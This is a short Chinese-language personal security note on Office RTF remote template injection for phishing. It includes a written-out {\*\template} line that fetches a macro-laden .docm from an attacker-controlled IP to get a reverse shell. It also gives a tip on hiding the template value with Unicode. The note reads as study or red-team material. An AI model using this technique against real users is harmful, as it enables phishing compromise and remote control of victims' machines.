---
category:
  - 网络安全
  - 钓鱼
tags:
  - 钓鱼附件
  - Office
  - RTF
  - 模板注入
---

# RTF注入Office模板

> [Office RTF远程模板注入 - Bl0od - 博客园 (cnblogs.com)](https://www.cnblogs.com/zUotTe0/p/15659420.html)
>
> [黑客越来越多地使用RTF模板注入技术进行网络钓鱼攻击 - 哈客部落 (hake.cc)](https://www.hake.cc/page/article/611.html)
>
> [【钓鱼从入门到放弃】-RTF文档 (atsud0.me)](https://atsud0.me/2022/01/【钓鱼从入门到放弃】-RTF文档/#CVE-2017-8570)
>
> [奇安信威胁情报中心 (qianxin.com)](https://ti.qianxin.com/blog/articles/Analysis-of-the-Donot-group's-attack-campaign-using-RTF-template-injection-against-the-neighbourhood/)
>
> ---
>
> [Decodificando ficheros RTF maliciosos (ciberseguridad.blog)](https://ciberseguridad.blog/decodificando-ficheros-rtf-maliciosos/)
>
> [Rich Text Format (RTF) Version 1.5 Specification (biblioscape.com)](https://www.biblioscape.com/rtf15_spec.htm)
>
> [RTF Template Injection: Phishing Attachment Techniques | Proofpoint US](https://www.proofpoint.com/us/blog/threat-insight/injection-new-black-novel-rtf-template-inject-technique-poised-widespread)
>
> ---
>
> [RTF sample which belongs to APT-C-35 group (only 4 detections in VT)](https://x.com/IntezerLabs/status/1389210529802170370?ref=ciberseguridad.blog)
>
> ---
>
> [富文本格式 (RTF) 1.5 版规范 --- Rich Text Format (RTF) Version 1.5 Specification (biblioscape.com)](https://www.biblioscape.com/rtf15_spec.htm)

RTF是富文本格式(Rich Text Format)又称多文本格式, 是由微软公司开发的跨平台文档格式

大多数的文字处理软件都能读取和保存RTF文档

RTF文档支持 `template` 参数, 可以指定目的模板路径来加载模板

![image-20240611163233113](http://cdn.ayusummer233.top/DailyNotes/202406121124421.png)

---

使用 Office Word 新建一个文档然后保存为 RTF 文档

![image-20240611111848392](http://cdn.ayusummer233.top/DailyNotes/202406121124431.png)

![image-20240611112041230](http://cdn.ayusummer233.top/DailyNotes/202406121124434.png)

使用文本编辑器打开此 RTF 文档

```
{\*\template http://100.1.1.131:8000/download/VBA_PowerShell.docm}
```

![image-20240611141220417](http://cdn.ayusummer233.top/DailyNotes/202406121124425.png)

![image-20240611151608170](http://cdn.ayusummer233.top/DailyNotes/202406121124391.png)

> 这样下载文件特别慢(

等待下载完执行即可达成反弹shell

![image-20240611151622885](http://cdn.ayusummer233.top/DailyNotes/202406121124429.png)

---

> [Office RTF远程模板注入 - Bl0od - 博客园 (cnblogs.com)](https://www.cnblogs.com/zUotTe0/p/15659420.html)
>
> [Rich Text Format (RTF) Version 1.5 Specification (biblioscape.com)](https://www.biblioscape.com/rtf15_spec.htm)

`*\template` 字段参数值可以为Unicode，可以更好隐藏自身

![image-20240612102526403](http://cdn.ayusummer233.top/DailyNotes/202406121124843.png)

![image-20240612112445656](http://cdn.ayusummer233.top/DailyNotes/202406121124781.png)

---

